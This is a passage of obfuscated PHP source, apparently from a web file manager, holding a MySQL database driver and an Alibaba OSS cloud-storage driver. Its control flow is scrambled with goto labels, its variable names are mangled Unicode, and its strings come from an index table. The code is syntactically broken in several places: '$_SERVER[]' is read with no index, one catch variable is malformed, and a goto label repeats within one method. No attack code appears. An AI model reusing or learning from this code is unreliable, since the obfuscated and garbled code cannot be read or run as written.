} public static function remove($Eƶ, $b솙 = false) { unset($_COOKIE[$Eƶ]); self::set($Eƶ, $_SERVER[][33], 1, $b솙); } } class DbMysql extends Db { public function __construct($c㠽 = '') { $E쬎 =& $_SERVER[]; if (!extension_loaded($E쬎[778])) { think_exception(think_lang($E쬎[10]) . $E쬎[864]); } if (!empty($c㠽)) { $this->config = $c㠽; if (empty($this->config[$E쬎[13]])) { $this->config[$E쬎[13]] = $E쬎[33]; } } } public function connect($a򾊼 = '', $eɪ氇 = 0, $d͐ = false) { $a =& $_SERVER[]; if (!isset($this->linkID[$eɪ氇])) { goto d; Fԏ: if (1 != think_config($a[18])) { unset($this->config); } goto F; b: mysql_query($a[869] . think_config($a[870]) . $a[55], $this->linkID[$eɪ氇]); if ($aϑ > $a[871]) { mysql_query($a[872], $this->linkID[$eɪ氇]); } $this->connected = !0; goto Fԏ; E: if ($B،þ) { $this->linkID[$eɪ氇] = mysql_pconnect($FՆҵ, $a򾊼[$a[867]], $a򾊼[$a[868]], 131072); } else { $this->linkID[$eɪ氇] = mysql_connect($FՆҵ, $a򾊼[$a[867]], $a򾊼[$a[868]], !0, 131072); } if (!$this->linkID[$eɪ氇] || !empty($a򾊼[$a[17]]) && !mysql_select_db($a򾊼[$a[17]], $this->linkID[$eɪ氇])) { think_exception(mysql_error()); } $aϑ = mysql_get_server_info($this->linkID[$eɪ氇]); goto b; d: if (empty($a򾊼)) { $a򾊼 = $this->config; } $FՆҵ = $a򾊼[$a[865]] . ($a򾊼[$a[866]] ? "\x3a{$a򾊼[$a[866]]}" : $a[33]); $B،þ = !empty($a򾊼[$a[13]][$a[14]]) ? $a򾊼[$a[13]][$a[14]] : $this->pconnect; goto E; F: } return $this->linkID[$eɪ氇]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($eގ) { goto d; d: $Cʹ״ =& $_SERVER[]; if (0 === stripos($eގ, $Cʹ״[262])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto E˕ƾ; E˕ƾ: if (!$this->_linkID) { return !1; } $this->queryStr = $eގ; if ($this->queryID) { $this->free(); } goto Dꉤ; F: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto f۵; Dꉤ: think_action_status($Cʹ״[19], 1); think_status($Cʹ״[20]); $this->queryID = mysql_query($eގ, $this->_linkID); goto F; f۵: } public function execute($cه) { goto c; B: think_status($a̴[20]); $aɲ = mysql_query($cه, $this->_linkID); $this->debug(); goto A; A: if (!1 === $aɲ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto A򉐸; C: $this->queryStr = $cه; if ($this->queryID) { $this->free(); } think_action_status($a̴[21], 1); goto B; c: $a̴ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto C; A򉐸: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[][873], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $B͘ = mysql_query($_SERVER[][874], $this->_linkID); $this->transTimes = 0; if (!$B͘) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $fɱש = mysql_query($_SERVER[][875], $this->_linkID); $this->transTimes = 0; if (!$fɱש) { $this->error(); return !1; } } return !0; } private function getAll() { $f젚 = array(); if ($this->numRows > 0) { while ($DǄ̸ = mysql_fetch_assoc($this->queryID)) { $f젚[] = $DǄ̸; } mysql_data_seek($this->queryID, 0); } return $f젚; } public function getFields($f) { $Fط =& $_SERVER[]; $aÿ糒 = $this->query($Fط[876] . $this->parseKey($f)); $b = array(); if ($aÿ糒) { foreach ($aÿ糒 as $cԘ => $D΢嘉) { $b[$D΢嘉[$Fط[27]]] = array($Fط[28] => $D΢嘉[$Fط[27]], $Fط[29] => $D΢嘉[$Fط[30]], $Fط[31] => (bool) (strtoupper($D΢嘉[$Fط[32]]) === $Fط[877]), $Fط[34] => $D΢嘉[$Fط[35]], $Fط[36] => strtolower($D΢嘉[$Fط[37]]) == $Fط[38], $Fط[39] => strtolower($D΢嘉[$Fط[40]]) == $Fط[41]); } } return $b; } public function getTables($Dۧ = '') { $cݶ =& $_SERVER[]; if (!empty($Dۧ)) { $FΏ = $cݶ[878] . $Dۧ . $cݶ[879]; } else { $FΏ = $cݶ[880]; } $C = $this->query($FΏ); $Bϊ = array(); foreach ($C as $dΚ => $aꍶ) { $Bϊ[$dΚ] = current($aꍶ); } return $Bϊ; } public function replace($d, $f = array()) { $E螦Ǽ =& $_SERVER[]; foreach ($d as $Dʶ => $f) { $B = $this->parseValue($f); if (is_scalar($B)) { $Fҩ[] = $B; $d[] = $this->parseKey($Dʶ); } } $f = $E螦Ǽ[881] . $this->parseTable($f[$E螦Ǽ[277]]) . $E螦Ǽ[882] . implode($E螦Ǽ[47], $d) . $E螦Ǽ[883] . implode($E螦Ǽ[47], $Fҩ) . $E螦Ǽ[884]; return $this->execute($f); } public function insertAll($eЃ, $BŲö = array(), $AϘ = false) { goto eϯ; eϯ: $dޟО =& $_SERVER[]; if (!is_array($eЃ[0])) { return !1; } $Dݱ = array_keys($eЃ[0]); goto E۹ŋʫ; C: $Eѳ = ($AϘ ? $dޟО[886] : $dޟО[887]) . $dޟО[888] . $this->parseTable($BŲö[$dޟО[277]]) . $dޟО[882] . implode($dޟО[47], $Dݱ) . $dޟО[889] . implode($dޟО[47], $cնҞ); return $this->execute($Eѳ); goto dФ; E۹ŋʫ: $cնҞ = array(); foreach ($eЃ as $eĉ) { $A = array(); foreach ($eĉ as $A => $B΢) { $B΢ = $this->parseValue($B΢); if (is_scalar($B΢)) { $A[] = $B΢; } } $cնҞ[] = $dޟО[258] . implode($dޟО[47], $A) . $dޟО[884]; } array_walk($Dݱ, array($this, $dޟО[885])); goto C; dФ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $eа =& $_SERVER[]; $this->error = mysql_errno() . $eа[4] . mysql_error($this->_linkID); if ($eа[33] != $this->queryStr) { $this->error .= LNG($eа[45]) . $this->queryStr; } think_trace($this->error, $eа[33], $eа[46]); return $this->error; } public function escapeString($Bц) { if ($this->_linkID) { return mysql_real_escape_string($Bц, $this->_linkID); } else { return mysql_escape_string($Bц); } } public function parseKey(&$d, $eĥ = true) { $B =& $_SERVER[]; if ($eĥ) { $d = $this->parseKeyCheck($d); } if ($d != $B[182] && !preg_match($B[890], $d)) { $d = $B[383] . trim($d, $B[383]) . $B[383]; } return $d; } } goto dۘ; f֠ʉ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($cͤڡ憤) { parent::__construct($cͤڡ憤); $this->signatureVersion($_SERVER[][212]); } public function fileOutLink($fϣ) { $dŢՐ =& $_SERVER[]; if (substr($fϣ, 0, 7) == $dŢՐ[1221]) { $fϣ = $dŢՐ[1222] . substr($fϣ, 7); } header($dŢՐ[159] . $fϣ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($Aыں) { parent::__construct(); include_once SDK_DIR . $_SERVER[][1277]; $this->_init($Aыں); } public function _init($Cȧϯ) { $F =& $_SERVER[]; foreach ($Cȧϯ as $fە昰 => $eί􍦊) { if (isset($this->{$fە昰})) { $this->{$fە昰} = $eί􍦊; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($F[1278] . LNG($F[1279])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto eӄ; a: $aӡ->addAllowedMethod($dϪ[1283]); $aӡ->addAllowedMethod($dϪ[1284]); $aӡ->addAllowedMethod($dϪ[158]); goto A՜; CѾ: $Aԧ->addRule($aӡ); try { $this->client->putBucketCors($this->bucket, $Aԧ); } catch (OSS\Core\OssException $fڈ) { return !1; } return !0; goto BϑՍ; E: $aӡ->addAllowedOrigin($dϪ[1280]); $aӡ->addAllowedMethod($dϪ[1281]); $aӡ->addAllowedMethod($dϪ[1282]); goto a; A՜: $aӡ->setMaxAgeSeconds(600); $aӡ->addExposeHeader($dϪ[1285]); $aӡ->addAllowedHeader($dϪ[1280]); goto CѾ; eӄ: $dϪ =& $_SERVER[]; $Aԧ = new OSS\Model\CorsConfig(); $aӡ = new OSS\Model\CorsRule(); goto E; BϑՍ: } public function getBucketCors() { goto fޑ󭅯; a⸌: return array($BȊ[181] => isset($eު[0]) ? $eު[0] : $BȊ[33], $BȊ[185] => $Dĺٓ, $BȊ[1286] => $a, $BȊ[1287] => isset($eނ[0]) ? $eނ[0] : $BȊ[33], $BȊ[183] => isset($e邵[0]) ? $e邵[0] : $BȊ[33]); goto d¯; fޑ󭅯: $BȊ =& $_SERVER[]; $c׾ = null; try { $c׾ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $c) { return null; } goto E胿ؘ; Fý: $a = $D泌Ӯ[0]->getMaxAgeSeconds(); $eނ = $D泌Ӯ[0]->getExposeHeaders(); $e邵 = $D泌Ӯ[0]->getAllowedHeaders(); goto a⸌; E胿ؘ: if (!$c׾ || !($D泌Ӯ = $c׾->getRules())) { return null; } $eު = $D泌Ӯ[0]->getAllowedOrigins(); $Dĺٓ = $D泌Ӯ[0]->getAllowedMethods(); goto Fý; d¯: } public function isBucketCors() { goto b; fܚ㍊: if ($C稤ե[$F[181]] != $F[182] || $C稤ե[$F[183]] != $F[182]) { return !1; } $FĪ = array_map($F[184], $C稤ե[$F[185]]); if (!is_array($FĪ)) { $FĪ = array(); } goto eȒ; b: $F =& $_SERVER[]; $C稤ե = $this->getBucketCors(); if (!$C稤ե || !is_array($C稤ե)) { return !1; } goto fܚ㍊; eȒ: $EЈ = array($F[186], $F[187], $F[188], $F[189], $F[190]); $Eײ = array_diff($EЈ, $FĪ); return empty($Eײ); goto a; a: } public function mkfile($E, $Cݧ۪ = '', $eφ = REPEAT_RENAME) { $f뎆 = $this->setContent($E, $Cݧ۪); if ($f뎆 !== !1) { return $this->getPathOuter($E); } return !1; } public function mkdir($a, $aЅ󿌷 = REPEAT_SKIP) { if ($this->_isFolder($a)) { return $this->getPathOuter($a); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($a)); } catch (OSS\Core\OssException $b煛) { return !1; } return $this->getPathOuter($a); } private function fileList($a܂, $fޖњ = '', $bՇ = 0) { goto d܎Ң; d܎Ң: $F =& $_SERVER[]; $a܂ = trim($a܂, $F[8]); $C = empty($a܂) && $a܂ !== $F[191] ? $F[33] : $a܂ . $F[8]; goto fԴ; fԴ: $bƏ = $F[33]; $F = 1000; $eϯڐ = $this->listItemCache === !1 ? !1 : !0; goto e̜; e̜: $Aԣ = $D = array(); while (!0) { check_abort(); $e = array($F[1288] => $fޖњ, $F[1289] => $C, $F[1290] => $F, $F[1291] => $bƏ); try { $FŻ = $this->client->listObjects($this->bucket, $e); } catch (OSS\Core\OssException $Dȓ) { break; } $bƏ = $FŻ->getNextMarker(); $fʕ = $FŻ->getObjectList(); $e歱 = $FŻ->getPrefixList(); foreach ($fʕ as $A) { goto Bש; Bש: if ($A->getKey() == $C) { continue; } $D = $A->getKey(); $D = $A->getSize(); goto eÄ; eÄ: $DʤÝ = $A->getLastModified(); $c˨ = $bՇ ? array($F[28] => $D, $F[78] => $D, $F[197] => strtotime($DʤÝ)) : $D; $a臙 = $D == 0 && substr($D, strlen($D) - 1, 1) == $F[8] ? !0 : !1; goto F; F: if ($eϯڐ) { $this->cacheMethod($F[199], $D, $a臙); $this->cacheMethod($F[200], $D, array($F[78] => $D, $F[1292] => $D, $F[84] => strtotime($DʤÝ), $F[1293] => $DʤÝ)); } if ($a臙) { $Aԣ[] = $D; continue; } $D[] = $c˨; goto E޸; E޸: } foreach ($e歱 as $dʩ) { $Aԣ[] = $dʩ->getPrefix(); if ($eϯڐ) { $this->cacheMethod($F[199], $D, !0); } } if ($bƏ === $F[33]) { break; } } if ($eϯڐ) { $this->cacheMethod($F[199], $a܂, !0); } goto eܳ; eܳ: return array($F[75] => $Aԣ, $F[74] => $D); goto B; B: } public function copyFile($Fъ, $B򃳆) { $F = $this->size($Fъ); if ($F < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Fъ, $this->bucket, $this->pathEncode($B򃳆)); } catch (OSS\Core\OssException $FǤ) { return !1; } return $this->getPathOuter($B򃳆); } $Fܲˑ؊ = $this->multiCopyObject($Fъ, $B򃳆, $F); return $Fܲˑ؊ ? $this->getPathOuter($B򃳆) : !1; } private function multiCopyObject($Dŉ, $Ȧ, $c) { $Eգ =& $_SERVER[]; try { goto BƸ㥭; F宄խ: $f = 1024 * 1024 * 10; $a = $this->client->generateMultiuploadParts($c, $f); foreach ($a as $c։ => $a) { $b쫬 = $b + (int) $a[$Eգ[1295]]; $D܉Ѩ = (int) $a[$Eգ[335]] + $b쫬 - 1; $e݉ = array($Eգ[1296] => $b쫬, $Eգ[1297] => $D܉Ѩ); $D؆[] = $this->client->uploadPartCopy($this->bucket, $Dŉ, $this->bucket, $this->pathEncode($Ȧ), $E, $Dۭ, $e݉); $E = $E + 1; } goto Bצʡ; BƸ㥭: $d = array(); if ($D = $this->hashMd5($Dŉ)) { $d = array(OSS\OssClient::OSS_HEADERS => array($Eգ[1294] => $D)); } $Dۭ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ȧ), $d); goto DΥ; Bצʡ: $fѿ = array(); foreach ($D؆ as $c։ => $Cڂ) { $fѿ[] = array($Eգ[1298] => $c։ + 1, $Eգ[1299] => $Cڂ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Ȧ), $Dۭ, $fѿ); goto Dͷ; DΥ: $E = 1; $b = 0; $D؆ = array(); goto F宄խ; Dͷ: } catch (OSS\Core\OssException $E) { return !1; } return !0; } public function moveFile($eԉ, $Eβ) { if ($this->copyFile($eԉ, $Eβ)) { $this->remove($eԉ); return $this->getPathOuter($Eβ); } return !1; } public function delFile($fɔ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($fɔ)); } catch (OSS\Core\OssException $eפ) { return !1; } return !0; } public function delFolder($cء) { goto A̖ӿ; cȃ: $cߑ = $this->delByBatch($f뻕[$D [75]]); if (!$cߑ) { return !1; } return $this->delFile($dرȟ); goto cҹ; CԌ: if (!empty($cء) && $cء !== $D [191] && !in_array($dرȟ, $f뻕[$D [75]])) { $f뻕[$D [75]][] = $dرȟ; } $cߑ = $this->delByBatch($f뻕[$D [74]]); if (!$cߑ) { return !1; } goto cȃ; A̖ӿ: $D  =& $_SERVER[]; if (!$this->exist($cء)) { return !0; } $this->listItemCache = !1; goto DȢ; DȢ: $f뻕 = $this->fileList($cء); $this->listItemCache = !0; $dرȟ = trim($cء, $D [8]) . $D [8]; goto CԌ; cҹ: } private function delByBatch($Dܟ) { foreach (array_chunk($Dܟ, 1000) as $a۸) { try { $this->client->deleteObjects($this->bucket, $a۸); } catch (OSS\Core\OssException $Aʏ) { return !1; } } return !0; } public function rename($e, $Fφʺ) { return $this->renameObject($e, $Fφʺ); } private function fileInfo($b۶, $D = false, $f = array()) { goto eǆ; eǆ: $f˴ =& $_SERVER[]; $f = array($f˴[28] => $this->pathThis($b۶), $f˴[76] => $this->getPathOuter($b۶), $f˴[29] => $f˴[193], $f˴[78] => isset($f[$f˴[78]]) ? $f[$f˴[78]] : 0, $f˴[168] => $this->ext($b۶)); if ($D) { return $f; } goto Fʌ; eշ͐: return $f; goto FΟ; Fʌ: $f[$f˴[194]] = $f[$f˴[84]] = 0; $f[$f˴[195]] = $f[$f˴[196]] = !0; if (empty($f)) { $F΅ = $this->objectMeta($b۶); if (!$F΅) { return $f; } $f = array($f˴[84] => strtotime($F΅[$f˴[1293]]), $f˴[78] => $F΅[$f˴[1292]] + 0); } goto aܠ; aܠ: if (isset($f[$f˴[78]])) { $f[$f˴[78]] = $f[$f˴[78]]; } if (isset($f[$f˴[84]])) { $f[$f˴[84]] = $f[$f˴[84]]; } if (isset($f[$f˴[197]]) && !trim($f[$f˴[84]])) { $f[$f˴[84]] = $f[$f˴[197]]; } goto eշ͐; FΟ: } private function folderInfo($F, $A򗎓 = false, $eό = array()) { goto aՏ; cŝݵ: if (isset($eό[$b⯊[84]])) { $E±[$b⯊[84]] = $eό[$b⯊[84]]; } if (isset($eό[$b⯊[194]])) { $E±[$b⯊[194]] = $eό[$b⯊[194]]; } return $E±; goto E; bﱂ: $E±[$b⯊[194]] = $E±[$b⯊[84]] = 0; $E±[$b⯊[195]] = $E±[$b⯊[196]] = !0; if (empty($eό)) { $F = rtrim($F, $b⯊[8]) . $b⯊[8]; $eӓǆ = $this->objectMeta($F); if (!$eӓǆ) { return $E±; } $eό = array($b⯊[194] => $eӓǆ[$b⯊[505]][$b⯊[1300]], $b⯊[84] => strtotime($eӓǆ[$b⯊[1293]])); } goto cŝݵ; aՏ: $b⯊ =& $_SERVER[]; $E± = array($b⯊[28] => $this->pathThis($F), $b⯊[76] => $this->getPathOuter($b⯊[8] . $F), $b⯊[29] => $b⯊[77]); if ($A򗎓) { return $E±; } goto bﱂ; E: } public function listPath($d, $DҲ = false) { $Dښ =& $_SERVER[]; $Cᗽǈ = $this->fileList($d, $Dښ[8], !0); foreach ($Cᗽǈ[$Dښ[75]] as $Aཥ˒˸ => $Dԇ) { $Cᗽǈ[$Dښ[75]][$Aཥ˒˸] = $this->folderInfo($Dԇ, $DҲ, $Dԇ); } foreach ($Cᗽǈ[$Dښ[74]] as $Aཥ˒˸ => $Dԇ) { $Cᗽǈ[$Dښ[74]][$Aཥ˒˸] = $this->fileInfo($Dԇ[$Dښ[28]], $DҲ, $Dԇ); } return $Cᗽǈ; } public function has($Fû, $fƓ = false, $aٞ = true) { goto Eڡ; f: while (!0) { check_abort(); $a = array($c[1288] => $c[8], $c[1289] => $b¸齑, $c[1290] => $DџհԹ, $c[1291] => $cֻᘗ); try { $A혶絠 = $this->client->listObjects($this->bucket, $a); } catch (OSS\Core\OssException $f䡱) { break; } $cֻᘗ = $A혶絠->getNextMarker(); $E̛ = $A혶絠->getObjectList(); $F = $A혶絠->getPrefixList(); if ($fƓ) { if (count($E̛) > 1 || count($E̛) == 1 && $E̛[0]->getKey() != $b¸齑) { $eчב += count($E̛) - 1; } if (!empty($F)) { $E쯈 += count($F); } if ($cֻᘗ === $c[33]) { break; } continue; } if ($aٞ) { if (!empty($E̛)) { if (count($E̛) > 1 || $E̛[0]->getKey() != $b¸齑) { return !0; } } } else { if (!empty($F)) { return !0; } } if ($cֻᘗ === $c[33]) { break; } } if ($fƓ) { return array($c[203] => $eчב, $c[204] => $E쯈); } return !1; goto EɆ溿; Eڡ: $c =& $_SERVER[]; $Fû = trim($Fû, $c[8]); $b¸齑 = empty($Fû) && $Fû !== $c[191] ? $c[33] : $Fû . $c[8]; goto DԒ; DԒ: $cֻᘗ = $c[33]; $DџհԹ = 500; $eчב = $E쯈 = 0; goto f; EɆ溿: } public function listAll($Dע) { $BɎ䚚 =& $_SERVER[]; $D = $this->fileList($Dע, $BɎ䚚[33], !0); $f = array(); foreach ($D[$BɎ䚚[74]] as $B) { $f[$B[$BɎ䚚[28]]] = $B[$BɎ䚚[78]]; } foreach ($D[$BɎ䚚[75]] as $B) { if (is_string($B)) { $f[$B] = 0; } } return $this->listAllFiles($Dע, array_keys($f), $f); } public function canRead($e؎ޢ) { $b =& $_SERVER[]; $E = $this->pathAcl($e؎ޢ); return $E == $b[1301] || $E == $b[544] ? !0 : !1; } public function canWrite($aȆ젫) { $Eً = $this->pathAcl($aȆ젫); return $Eً == $_SERVER[][544] ? !0 : !1; } public function pathAcl($E) { goto E귆Մ; c̦: $eۊʪ = $eݕ == $aӹ[34] ? $this->bucketAcl : $eݕ; if ($eۊʪ == $aӹ[1302]) { return $aӹ[1301]; } if ($eۊʪ == $aӹ[1303]) { return $aӹ[544]; } goto dɃ; dɃ: return $eۊʪ; goto D橙; E귆Մ: $aӹ =& $_SERVER[]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $eݕ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($E)); } catch (OSS\Core\OssException $A;҂) { return !1; } goto c̦; D橙: } private function chmodPath($e˝, $B묅 = '') { $D粓 =& $_SERVER[]; $F؞Ȥ = empty($B묅) ? $D粓[1303] : $B묅; $Dú = array($D粓[34], $D粓[192], $D粓[1302], $D粓[1303]); if (!in_array($F؞Ȥ, $Dú)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($e˝), $F؞Ȥ); } catch (OSS\Core\OssException $cؙ) { return !1; } return !0; } public function getContent($B) { return $this->fileSubstr($B, -1); } public function setContent($eɚ, $c֕ = '') { $D =& $_SERVER[]; try { $A = $this->trafficLimit($D[1304]); $a絣 = $this->client->putObject($this->bucket, $this->pathEncode($eɚ), $c֕, $A); } catch (OSS\Core\OssException $dϦ) { return !1; } $c = array($D[1294] => trim($a絣[$D[1305]], $D[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($eɚ))); $this->updateObjMeta($eɚ, $c); return isset($a絣[$D[1306]][$D[1253]]) ? !0 : !1; } private function updateObjMeta($f, $Fė) { $f = $this->pathEncode($f); try { $b = array(OSS\OssClient::OSS_HEADERS => $Fė); $this->client->copyObject($this->bucket, $f, $this->bucket, $f, $b); } catch (OSS\Core\OssException $F) { return !1; } return !0; } public function upload($E֑, $dʜ, $c = false, $EЫ = REPEAT_REPLACE) { $CȈ =& $_SERVER[]; $E۪҈ = trim($E֑, $CȈ[8]); $E߈֖ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($CȈ[1294] => @md5_file($dʜ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($E֑))); $E߈֖ = $this->trafficLimit($CȈ[1304], $E߈֖); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($E۪҈), $dʜ, $E߈֖); } catch (OSS\Core\OssException $aԃԤ) { return !1; } return $this->getPathOuter($E֑); } public function getHost() { $e =& $_SERVER[]; $E = explode($e[177], parent::getHost()); return $E[0] . $e[177] . $this->bucket . $e[95] . $E[1]; } public function uploadFormData($c䘱, $A瓾 = 3600) { goto Aϝ; Dƾť˧: $Dƒ = base64_encode(hash_hmac($B밡[230], $c, $this->secret, !0)); $DԨ = array($B밡[1218] => $c, $B밡[1310] => $this->accessKey, $B밡[1214] => $B밡[1206], $B밡[1311] => $Dƒ, $B밡[175] => $eד); $DԨ = $this->trafficLimit($B밡[1304], $DԨ); goto A; Aϝ: $B밡 =& $_SERVER[]; if (!($eד = $this->getHost())) { return !1; } $bȿ睤 = $A瓾; goto a֭۳; A: return $DԨ; goto eҊ; Fգސ: $AԘ܄ = strpos($dΊ, $B밡[294]); $dΊ = substr($dΊ, 0, $AԘ܄) . $B밡[1308]; $f = 1048576000 * 5; goto C; a֭۳: $ç = date($B밡[1307], time() + $bȿ睤); $Fʊ = new DateTime($ç); $dΊ = $Fʊ->format(DateTime::ISO8601); goto Fգސ; C: $C؟ = $this->pathFather($c䘱); $E = array($B밡[1208] => $dΊ, $B밡[1209] => array(array($B밡[1309], 0, $f), array($B밡[1212], $B밡[1213], $C؟))); $c = base64_encode(json_encode($E)); goto Dƾť˧; eҊ: } public function multiUploadFormData($cќ, $E晵 = 3600) { $fߣɋ =& $_SERVER[]; if (!($e = $this->getHost())) { return !1; } $C = $this->trafficLimit($fߣɋ[1304]); $d = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($cќ), $C); return array($fߣɋ[221] => $d, $fߣɋ[175] => $e . $fߣɋ[8] . $this->pathEncode($cќ), $fߣɋ[222] => gmdate($fߣɋ[1312]), $fߣɋ[93] => $cќ); } public function multiUploadAuthData($Dޣ, $A = array()) { goto cˌ; Eᆳ: $C؞ՠ = array($f֤[224], $f֤[33], $f֤[119], $cۻ猝, "\170\x2d\157\163\x73\55\144\x61\164\145\x3a{$cۻ猝}", $f֤[8] . $this->bucket . $f֤[8] . $eح . $eسϐ); if (strpos($eسϐ, $f֤[225]) === 0) { $C؞ՠ[0] = $f֤[226]; if ($Dȱ = $this->trafficLimit($f֤[1304])) { $eح = $f֤[1313]; array_splice($C؞ՠ, 5, 0, $eح . $f֤[4] . $Dȱ[$eح]); } } if (isset($A[$f֤[227]]) && $A[$f֤[227]] == $f֤[228]) { $C؞ՠ[0] = $f֤[228]; } goto B԰؊; dׅ: $eح = $Dޣ; if (isset($A[$f֤[93]])) { $eح = $A[$f֤[93]]; unset($A[$f֤[93]]); } if (isset($A[$f֤[223]])) { $A[$f֤[222]] = $cۻ猝; return $this->listUploadParts($eح, $A); } goto Eᆳ; cˌ: $f֤ =& $_SERVER[]; $cۻ猝 = isset($A[$f֤[222]]) ? $A[$f֤[222]] : gmdate($f֤[1312]); $eسϐ = isset($A[$f֤[168]]) ? $A[$f֤[168]] : $f֤[33]; goto dׅ; B԰؊: if (!empty($A[$f֤[1314]])) { $f = array_merge(array($C؞ՠ[4]), $A[$f֤[1314]]); sort($f); $C؞ՠ[4] = implode($f֤[229], $f); } $FɃ = implode($f֤[229], $C؞ՠ); $CϞ = base64_encode(hash_hmac($f֤[230], $FɃ, $this->secret, !0)); goto A˿; A˿: $fҍ = $f֤[1278] . $this->accessKey . $f֤[4] . $CϞ; if (strpos($eسϐ, $f֤[225]) === 0) { $fҍ = array($f֤[232] => $fҍ, $f֤[222] => $cۻ猝); if ($Dȱ) { $fҍ = array_merge($fҍ, $Dȱ); } } return $fҍ; goto Eѽ; Eѽ: } public function listUploadParts($F, $cΰ) { goto EЬ; EЬ: $eܑ =& $_SERVER[]; $aߠ = parse_url_query($cΰ[$eܑ[168]]); $fФ = $this->client->listParts($this->bucket, $this->pathEncode($F), $aߠ[$eܑ[221]]); goto C; C: unset($cΰ[$eܑ[223]], $cΰ[$eܑ[227]]); $dˡ֞ = $this->multiUploadAuthData($F, $cΰ); if (empty($dˡ֞)) { return !1; } goto E՝; C: $D캹 = $fФ->getListPart(); $c = array(); foreach ($D캹 as $aʸ) { $c[] = array($eܑ[1298] => $aʸ->getPartNumber(), $eܑ[1299] => trim($aʸ->getETag(), $eܑ[116])); } goto C; E՝: return array($eܑ[232] => $dˡ֞, $eܑ[222] => $cΰ[$eܑ[222]], $eܑ[234] => $c); goto d; d: } public function download($ḇ, $EΙ҂) { if ($this->isFolder($ḇ)) { return !1; } try { $CŦ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $EΙ҂); $CŦ = $this->trafficLimit($_SERVER[][109], $CŦ); $this->client->getObject($this->bucket, $this->pathEncode($ḇ), $CŦ); } catch (OSS\Core\OssException $f) { return !1; } return $EΙ҂; } public function fileSubstr($F܉, $eʊ̉ = 0, $D׮ = false) { if ($eʊ̉ === -1) { $F싌 = array(); } else { if ($D׮ === !1) { $fΖ = $this->size($F܉); } else { $fΖ = $eʊ̉ + $D׮ - 1; } $F싌 = array(OSS\OssClient::OSS_RANGE => "{$eʊ̉}\x2d{$fΖ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($F܉), $F싌); } catch (OSS\Core\OssException $fю) { think_exception($fю->getMessage()); return !1; } } private function trafficLimit($f෩, $dᑕӱӖ = array()) { goto f; f: $F =& $_SERVER[]; if ($f෩ == $F[1304] && $this->isUploadServer() || $f෩ == $F[109] && $this->isFileOutServer()) { return $dᑕӱӖ; } $b؍ = floatval($GLOBALS[$F[6]][$F[88]][$F[107]][$f෩]) * 1024 * 1024 * 8; goto C۴Ҥ; C۴Ҥ: if (!$b؍) { return $dᑕӱӖ; } $b؍ = $b؍ < 819200 ? 819200 : ($b؍ > 838860800 ? 838860800 : $b؍); $dᑕӱӖ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($b؍); goto b嚯؉; b嚯؉: return $dᑕӱӖ; goto Aޕ; Aޕ: } public function link($A, $c = array()) { $d =& $_SERVER[]; if (!$this->exist($A) || $this->isFolder($A)) { return !1; } try { $c = $this->trafficLimit($d[109], $c); $eۜ = $this->client->signUrl($this->bucket, $this->pathEncode($A), 3600 * 12, $d[228], $c); return $this->getCdnLink($eۜ); } catch (OSS\Core\OssException $Fʬ) { return !1; } } public function fileOut($dӌ, $d޼ = false, $d = false, $eҧ = '') { goto DȠ; DȠ: $Bϒ =& $_SERVER[]; if ($this->isFileOutServer()) { return $this->fileOutServer($dӌ, $d޼, $d, $eҧ); } if (!$d) { $d = $this->pathThis($dӌ); } goto CЛ; CЛ: $d = rawurlencode($d); $D = get_file_mime(get_path_ext($d)); if ($D == $Bϒ[213]) { return parent::fileOut($dӌ, $d޼, $d, $eҧ); } goto B; e: $cʓ = $this->link($dӌ, $A䈔); $this->fileOutLink($cʓ); goto bΞ; B: $d޼ = $d޼ ? $Bϒ[214] : $Bϒ[215]; $A䈔 = array(OSS\OssClient::OSS_SUB_RESOURCE => $Bϒ[1315] . rawurlencode("{$d޼}\73\146\151\154\145\x6e\x61\155\x65\x3d{$d}")); $A䈔[OSS\OssClient::OSS_SUB_RESOURCE] .= $Bϒ[1316] . rawurlencode($D); goto e; bΞ: } public function fileOutServer($b¼, $bʦĭ = false, $Fȣ = false, $E = '') { parent::fileOut($b¼, $bʦĭ, $Fȣ, $E); } public function fileOutImage($F, $C = 250) { $Cዦ = array(OSS\OssClient::OSS_PROCESS => 